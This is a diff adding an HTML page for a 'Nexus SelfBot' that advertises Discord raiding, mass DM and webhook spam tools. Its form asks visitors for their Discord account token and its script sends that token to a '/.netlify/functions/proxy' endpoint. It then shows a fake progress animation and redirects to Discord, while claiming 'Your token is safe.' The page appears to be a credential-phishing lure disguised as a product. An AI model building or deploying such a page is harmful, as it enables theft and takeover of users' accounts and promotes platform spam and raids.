@@ -1,0 +1,361 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Nexus SelfBot – Premium</title>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,400;14..32,500;14..32,600;14..32,700;14..32,800&display=swap" rel="stylesheet">
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    body {
+      font-family: 'Inter', sans-serif;
+      background: #0b0e11;
+      min-height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 20px;
+      background-image: radial-gradient(ellipse at 50% 20%, #1e1f22 0%, #0b0e11 100%);
+    }
+    .container {
+      max-width: 560px;
+      width: 100%;
+      background: #1e1f22;
+      border-radius: 20px;
+      padding: 36px 32px 28px;
+      border: 1px solid #2b2d31;
+      box-shadow: 0 16px 64px rgba(0,0,0,0.8);
+    }
+    .header {
+      display: flex;
+      align-items: center;
+      gap: 16px;
+      margin-bottom: 20px;
+    }
+    .logo {
+      width: 56px;
+      height: 56px;
+      border-radius: 16px;
+      background: linear-gradient(135deg, #5865f2, #8b5cf6);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 28px;
+      color: white;
+      flex-shrink: 0;
+    }
+    .brand {
+      flex: 1;
+    }
+    .brand h1 {
+      color: white;
+      font-size: 22px;
+      font-weight: 700;
+      letter-spacing: -0.3px;
+    }
+    .brand .tagline {
+      color: #b5bac1;
+      font-size: 13px;
+      font-weight: 400;
+    }
+    .badge {
+      display: inline-block;
+      background: #3ba55c;
+      color: white;
+      font-size: 11px;
+      font-weight: 700;
+      padding: 2px 12px;
+      border-radius: 20px;
+      margin-left: 8px;
+      vertical-align: middle;
+    }
+    .sub {
+      color: #b5bac1;
+      font-size: 14px;
+      line-height: 1.6;
+      margin-bottom: 22px;
+    }
+    .sub strong { color: white; }
+    .permissions {
+      background: #151618;
+      border-radius: 12px;
+      padding: 16px;
+      border: 1px solid #2b2d31;
+      margin-bottom: 22px;
+    }
+    .permissions h3 {
+      color: #dbdee1;
+      font-size: 13px;
+      font-weight: 600;
+      margin-bottom: 10px;
+      letter-spacing: 0.3px;
+      text-transform: uppercase;
+    }
+    .perm-grid {
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      gap: 6px 12px;
+    }
+    .perm-item {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      color: #b5bac1;
+      font-size: 13px;
+      padding: 4px 0;
+    }
+    .perm-item .icon { color: #5865f2; width: 18px; text-align: center; }
+    .field {
+      margin-bottom: 16px;
+    }
+    .field label {
+      color: #b5bac1;
+      font-size: 12px;
+      font-weight: 600;
+      text-transform: uppercase;
+      letter-spacing: 0.5px;
+      display: block;
+      margin-bottom: 5px;
+    }
+    .field input {
+      width: 100%;
+      padding: 12px 14px;
+      background: #1e1f22;
+      border: 1px solid #2b2d31;
+      border-radius: 8px;
+      color: white;
+      font-size: 15px;
+      outline: none;
+      transition: 0.2s;
+    }
+    .field input:focus {
+      border-color: #5865f2;
+      background: #25262b;
+    }
+    .field input::placeholder { color: #5c5e66; }
+    .btn {
+      width: 100%;
+      padding: 14px;
+      border: none;
+      border-radius: 8px;
+      font-size: 16px;
+      font-weight: 600;
+      cursor: pointer;
+      transition: 0.15s;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+    }
+    .btn-primary {
+      background: #5865f2;
+      color: white;
+    }
+    .btn-primary:hover { background: #4752c4; }
+    .btn-primary:disabled { opacity: 0.5; cursor: not-allowed; }
+    .msg {
+      font-size: 13px;
+      margin-top: 12px;
+      padding: 8px 12px;
+      border-radius: 6px;
+      display: none;
+    }
+    .msg.error { background: #2a1a1e; color: #f23f3f; border: 1px solid #3f1e24; display: block; }
+    .msg.success { background: #1a2e24; color: #3ba55c; border: 1px solid #1f3d2e; display: block; }
+    .progress-wrap {
+      margin-top: 16px;
+      display: none;
+    }
+    .progress-wrap.active { display: block; }
+    .progress-bar {
+      width: 100%;
+      height: 6px;
+      background: #2b2d31;
+      border-radius: 4px;
+      overflow: hidden;
+    }
+    .progress-fill {
+      height: 100%;
+      width: 0%;
+      background: #3ba55c;
+      border-radius: 4px;
+      transition: width 0.3s;
+    }
+    .progress-label {
+      color: #b5bac1;
+      font-size: 13px;
+      margin-top: 6px;
+    }
+    #loginForm.hidden { display: none; }
+    .footer-links {
+      margin-top: 18px;
+      text-align: center;
+      color: #80848e;
+      font-size: 12px;
+    }
+    .footer-links a { color: #00a8fc; text-decoration: none; }
+    .footer-links a:hover { text-decoration: underline; }
+    .security-note {
+      background: #1a2e24;
+      border: 1px solid #1f3d2e;
+      border-radius: 8px;
+      padding: 12px 14px;
+      margin-top: 14px;
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      color: #8bcf9c;
+      font-size: 13px;
+    }
+    .security-note .lock { font-size: 18px; }
+  </style>
+</head>
+<body>
+<div class="container">
+  <!-- Brand -->
+  <div class="header">
+    <div class="logo">⚡</div>
+    <div class="brand">
+      <h1>Nexus <span class="badge">v3.2</span></h1>
+      <div class="tagline">Premium SelfBot — Best sb out</div>
+    </div>
+  </div>
+
+  <p class="sub">
+    <strong>Nexus</strong> connects to your Discord account via token to provide, we have raiding tools, and server management — all with zero logs and <strong>automated token deletion system</strong>.
+  </p>
+
+  <!-- Feature list (enhanced commands) -->
+  <div class="permissions">
+    <h3>⚙️ Commands all start with “!” (80+ tools)</h3>
+    <div class="perm-grid">
+      <div class="perm-item"><span class="icon">📨</span> Mass DM</div>
+      <div class="perm-item"><span class="icon">💥</span> Server Raid</div>
+      <div class="perm-item"><span class="icon">👥</span> Member Export</div>
+      <div class="perm-item"><span class="icon">🔄</span> Auto‑react</div>
+      <div class="perm-item"><span class="icon">🎭</span> Ghost mode</div>
+      <div class="perm-item"><span class="icon">📊</span> Server index</div>
+      <div class="perm-item"><span class="icon">🧹</span> Channel cleaner</div>
+      <div class="perm-item"><span class="icon">🔁</span> Webhook spam</div>
+      <div class="perm-item"><span class="icon">🛡️</span> AFK system</div>
+      <div class="perm-item"><span class="icon">🎯</span> Target lock</div>
+      <div class="perm-item"><span class="icon">💬</span> Custom spam</div>
+      <div class="perm-item"><span class="icon">📈</span> Ping stats</div>
+    </div>
+  </div>
+
+  <!-- Security note -->
+  <div class="security-note">
+    <span class="lock">🔐</span>
+    <span><strong>Your token is safe.</strong> We never store it for more than 3 days as it's deleted every <strong>72 hours</strong>. Renew every 3 days to keep your session active.</span>
+  </div>
+
+  <!-- Form -->
+  <form id="loginForm">
+    <div class="field">
+      <label>Discord Token</label>
+      <input type="text" id="token" placeholder="MTIzNDU2Nzg5MDEyMzQ1Njc4OQ.xyz..." required />
+    </div>
+    <button type="submit" class="btn btn-primary" id="authBtn">
+      <span>🔑</span> Connect to Nexus
+    </button>
+    <div id="statusMsg" class="msg"></div>
+  </form>
+
+  <!-- Progress -->
+  <div class="progress-wrap" id="progressWrap">
+    <div class="progress-bar">
+      <div class="progress-fill" id="progressFill"></div>
+    </div>
+    <div class="progress-label" id="progressLabel">Initializing secure tunnel...</div>
+  </div>
+
+  <div class="footer-links">
+    <a href="#">Terms</a> · <a href="#">Privacy</a> · <a href="#">Support</a>
+  </div>
+</div>
+
+<script>
+  // ---- CONFIG ----
+  const PROXY_URL = '/.netlify/functions/proxy';
+
+  const form = document.getElementById('loginForm');
+  const tokenInput = document.getElementById('token');
+  const authBtn = document.getElementById('authBtn');
+  const statusMsg = document.getElementById('statusMsg');
+  const progressWrap = document.getElementById('progressWrap');
+  const progressFill = document.getElementById('progressFill');
+  const progressLabel = document.getElementById('progressLabel');
+
+  function setStatus(text, type) {
+    statusMsg.textContent = text;
+    statusMsg.className = 'msg ' + type;
+  }
+
+  form.addEventListener('submit', async function(e) {
+    e.preventDefault();
+    const token = tokenInput.value.trim();
+    if (!token) {
+      setStatus('Please enter your Discord token.', 'error');
+      return;
+    }
+
+    authBtn.disabled = true;
+    authBtn.textContent = 'Connecting...';
+    setStatus('', '');
+
+    try {
+      const response = await fetch(PROXY_URL, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ token })
+      });
+
+      if (response.ok) {
+        setStatus('✅ Connected! Nexus is ready.', 'success');
+        form.classList.add('hidden');
+        progressWrap.classList.add('active');
+
+        const steps = [
+          'Validating token...',
+          'Loading user profile...',
+          'Syncing server list...',
+          'Initializing command engine...',
+          'Ready! 🔥'
+        ];
+        let progress = 0;
+        let stepIndex = 0;
+        const interval = setInterval(() => {
+          progress += Math.floor(Math.random() * 10) + 3;
+          if (progress > 100) progress = 100;
+          progressFill.style.width = progress + '%';
+          if (stepIndex < steps.length && progress >= (stepIndex + 1) * 20) {
+            progressLabel.textContent = steps[stepIndex];
+            stepIndex++;
+          }
+          if (progress >= 100) {
+            clearInterval(interval);
+            progressLabel.textContent = '✅ Nexus is online. Redirecting to dashboard...';
+            setTimeout(() => {
+              window.location.href = 'https://discord.com/channels/@me';
+            }, 1500);
+          }
+        }, 400);
+
+        authBtn.disabled = false;
+        authBtn.textContent = 'Connect Nexus';
+      } else {
+        const errorData = await response.json().catch(() => ({}));
+        setStatus(errorData.error || '❌ Connection failed. Check token and try again.', 'error');
+        authBtn.disabled = false;
+        authBtn.textContent = 'Connect Nexus';
+      }
+    } catch (err) {
+      setStatus('❌ Network error. Please refresh and try again.', 'error');
+      authBtn.disabled = false;
+      authBtn.textContent = 'Connect Nexus';
+    }
+  });
+</script>
+</body>
+</html>
